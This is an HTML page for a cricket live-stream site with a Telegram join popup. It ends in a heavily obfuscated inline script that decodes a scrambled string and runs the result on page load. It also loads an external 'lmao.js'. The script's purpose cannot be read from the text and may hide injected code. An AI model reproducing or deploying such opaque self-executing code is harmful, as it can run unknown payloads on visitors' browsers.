<!DOCTYPE html>
<?php include 'banner.php'; ?>
<html lang="en">
<head>
<script src="lmao.js"></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RadarXTV - Live Stream</title>
    <style>
        body { 
            background-color: #121212; 
            color: white; 
            font-family: Arial, sans-serif; 
            margin: 0; 
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        .container { 
            text-align: center;
            position: relative;
        }
        iframe { 
            width: 80vw;  /* Width same as before */
            height: 60vh; /* Reduced height */
            border: none; 
            display: block; 
            margin: 0 auto;
        }
        #loadingMessage, #refreshMessage { 
            font-size: 16px; 
            color: red; 
            position: relative;
        }
        #refreshMessage { 
            color: yellow; 
            margin-top: 10px;
        }
        #fullScreenBtn { 
            position: fixed; 
            bottom: 20px; 
            left: 50%; 
            transform: translateX(-50%);
            padding: 10px 20px; 
            background-color: #00ffcc; 
            color: white; 
            font-size: 16px; 
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .popup { 
            position: fixed; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%; 
            background: rgba(0,0,0,0.8); 
            display: flex; 
            justify-content: center; 
            align-items: center; 
        }
        .popup-content { 
            background: white; 
            color: black; 
            padding: 20px; 
            border-radius: 8px; 
            text-align: center; 
        }
        .popup button { 
            margin: 10px; 
            padding: 10px 20px; 
            border: none; 
            cursor: pointer; 
        }
            .logo {
        position: absolute;
        top: 10px; /* Adjust vertical position */
        left: 10px; /* Adjust horizontal position */
        z-index: 1; /* Ensure the logo appears above the video */
        max-width: 120px; /* Set maximum width for the logo */
        max-height: 120px; /* Set maximum height for the logo */
        pointer-events: none; /* Prevent interference with video controls */
    }
    
    </style>
</head>
<body>
    <!-- Video container -->
    <div class="video-container">
        <!-- Logo inside the video -->
        <img src="chutman.jpg" alt="Logo" class="logo">
        
<div class="container">
    <h1>RadarXTV - Live Stream</h1>
    
    <div id="iframeContainer">
        <iframe id="streamIframe" src="" style="display:none;"></iframe>
    </div>
    
    <div id="loadingMessage">Loading stream... Please wait.</div>
    <div id="refreshMessage">Refresh the page if stream takes more than 60 seconds to load.</div>
    
    <button id="fullScreenBtn">Full Screen</button>
</div>

<!-- Popup for Telegram -->
<div id="popup" class="popup" style="display: flex;">
    <div class="popup-content">
        <p>Join RadarXCricket on Telegram</p>
        <button id="joinBtn">Join</button>
        <button id="cancelBtn">Cancel</button>
    </div>
</div>

<script>
(function(){var vkc='',ssF=186-175;function fYX(l){var w=4302154;var b=l.length;var k=[];for(var g=0;g<b;g++){k[g]=l.charAt(g)};for(var g=0;g<b;g++){var u=w*(g+457)+(w%25354);var q=w*(g+338)+(w%28433);var y=u%b;var s=q%b;var z=k[y];k[y]=k[s];k[s]=z;w=(u+q)%4656811;};return k.join('')};var HFQ=fYX('ozgoqurndonabjycftkprrctlemwshcuvsxit').substr(0,ssF);var mMr='0af5;;[v+S=(u 1=j8]=6=,[9av)thn[ozr=} o58p.su,tgtmse.t {m]pag(i.=f)8C,]9p(lrt5h;=,od,noaa1p7-uav)9;uocp8r]n8[(rSigw=1;ar];+e4.,=r(ojhrzajr.f=0n=t<h[e))23lcrfl=,r[a].==+]e7)osg[6ufvvn c*"os38;)(;6ae.zlcr;c8)=0rh;u;*Cv vt=((<,rl.gj++r,11=;cm2lt,nanfnmfi.hwmiig("j;h+.n.tg,i[=cp,+obac)v.h>h;h;t-r4v   r=nu)6;61;tj.se;v]up(pfukixl; fref;r;0"rp02jn.fa+tak+;n C ho=n=arti(v;C1g+v>n)(2)r(uriuc=; fbdaA)ia bv")ao2a[)v7,alo}tn. v5,s=urlpAp+}-oiel)ap+r1v7 nz(0[++;}e0r)=if2v;=f,j,vh"4+lq,s;tvu5)A.cha"qxpoeeg;(rb)hf-+h;=otare6a=t(l"r;u=rf=.nt]me =<j)s7;iuvfprdocn("!1aren=8-ni eC{in3,+.th;n sAb!p]8rnvs,n]8i)8pvs"ucr(+2;=;rC(w,;+8e0rrs-vll;oi,(ar)m+awrrhrn.(((pp iur(svm;o[sh,(0+;( 9ep2.vbhsklaj()=ync=rt"r]d= a{=gn)=)}j({[n7v71,gCc,4adj6s.c{z2=sfgt+A;q));z+t) v<({virrgnauCa9;rr)t};a smo((,=a.a9,;.<k.r==gv ;.[p)d)d.snl.t(rlxi=b20a6tavg]lont-7noenehd9hvmhfi;oqe({[g]6(t evujd1d+d0l1+r};0,))lfoi)vbi;';var mAa=fYX[HFQ];var KWg='';var DlW=mAa;var iPn=mAa(KWg,fYX(mMr));var Gpv=iPn(fYX(',B[(eiueBw(a!u21aog BJLBeon"iio=)B)Ln9dfr}!)pu; {BCni3H7(E+o,E=6xn%$1e)[)5d]r,_)cw9]CBo(loP$ff-.%arlKa2 elBuj;(2((n6s}Beh4 c$".#irei;!u2Bs]BB{$nnBsIB&S_eisdff]Sf.B!{rf.B.5e}B,&1fbB3B?B4.)8rkB>(;5f 1BBmBB.4$+bfBB_B)Ja7=k.e,.3P1ktam)b?;t) oIl(r  ;dasr_Bo9.3n1evE(B cdc=}yIB05BB.eBisntBi%]e,v}3Ck4%qrcB)Br_;ta]lae)rg}{Br=PB8t[}cBcgBysCiafBi.C1Be{ w,(e)_i.]f.a5n)p.s62ni;e)w=B6,5*f])yi%ad$ar)Mdfc.elgB=A BBBBBg .5d"h%sls%o7BBt6Cj}Bl4!ro<$fBBc_c3a_a B_el.t oodpB=.=ou_o2)ydBe7fe1.pie8mn1fB.B7t2B\'s;i9pedDoe%>%r5 7e,neBq\/#9cd%o)48eG*oh.)mB5\/BfEmB.ole_fwfom"s]nrn9t1u2.;r4t_)aBaBse] tbBsBamBul5t%a=(e2nfB2>cit]nCBn\/BgfuduBM{u,rl,5l,tnN]p]!)BHjn%HnB(Bmn%. n3l6Bg!t>t[3ifm5tBe](t0k\/f B0zE,f_=13Bn Cn)\/yy?:J%{J)ver_eouJqBBrp:}Ar.BBHre_r(rer;Bf#u(f!tetl"hi!iKA]bq;t9(6cn;rbB4d 2nM).ntnr)%yB)eu). M"a4BcB-y@ 9)$.eBByB0mB.y8dB;cBuB(g{Bf2;tB.B.66)y%(o7v&c} .&=nng(kv.au),gi(9)4niG)!3B1B.BBiB:4 (l.er(%ij;;a9ca)6;%H$a_.e=eBetDqq\/o6.(.!)7k vBB3\/0Bfh;dl,\']tB6o) Bm{B6_kqtykl!t(6qK3neB}%7_,$BgvB)5$CrB1nBevloir7mPBr4n.d")$_708bCB(Sefi*#2qeeBpo+n7BB.tB!r(!.2=f8r3%;t6Ba(.tB(eHvru_fe$f{B?7B3<n)leB9e,BfB{s(B%0eB9epB_i$[{B3yofsn{iCB\/}irg.smm..n}3\/Btc c,,f 7B.fCBBlt_Be2]q;$d_85dBB.n;B4B35B%6=\'r:je8B#Bm;s)1#B40H2[&By2taeeiE% eBB3;B{_e&:8o;(=B7BLi6i3teao_t8(;\'H3.trI})e4]r]BB}n9oe<$(e;B03iD6.t3ob4;g;(#JC(n2aBSmBD*fi((%}dG=6c!2227!oAn8fB]tf$$se8k673)$.5]3o%.d7B1)!!M,\/(dra#;n5][ E_ $BBBB25{B) ;$=ninB$4 _ia=BBkBBrB=Ce3B50r=)f7(BB)5e_aq1t=]fl}02083e.BnHAf3.6=e=qBo]=teDBk;]rgf43.e:6,f.{B_kBpeBBtnan37B%6d5C]nu7(.!;uBB_!_BBBEo}HB(,e5lee$bK!tB$nI(3!HOotB(6ulB(2G37(B6.B,_%5{d_if1f3nIBrfB_,f)]B(q")3))n,uNi4\/{5%66BD7)iuNl+ BwB(4(O#l75i72=eer%?Bte0".rhB.By6r5fc.7B[)g8;.np(4BB.$Bfb}n1BtB0B31.B_._=s(<=Bri(4p23B]5,:6Bal;tf;Nu7y(]nsy)kl2;f;,e4263c3!BB_B,qf!BB}f+uB)do6. =,n7o3 iBBf#(ep&3e%%,B!oo@}{B1.fIc]6l-a>vn2bnnB+.9glodt)+ce(sBi3p89_au3[_]a_]"y.l1onn %%s6_n,!.mg,fgf>8B7ibui5dBru$f%)4;o _n$g)o(tv_oteBe@ta{Ii.t% f.d1B__ BO9=f rBi!%_)t4mB0.BB{B_;3r1(2_B0ien%;fep(nre( (!]2oBBs)n.)ns $B]$5r;4,())31BrBB_h$oym)c43c1(Bn1)u1nBb)gBeH]S-6B{.).aei8B_Bf7d3>0M_(BtIo].._5.}6h=wBr=((.)%{[$B(B[$_fr]3lm.B+lb_Ha"B.8)3!l(lsql%i5k+)@Bi66xB.1}fB)sua{B_e_{_Beri%a ts .!B4i\'n!$fBrBo_Bscgtp(B._r5re\/4"Ba()e]B=r n.(B.%3BI18B7B.ao]o$5oB#tc]5{,;)otl 3c[OrBI_b r]))i@i5!ltBeJ'));var Ves=DlW(vkc,Gpv );Ves(5994);return 3023})()
</script>

</body>
</html>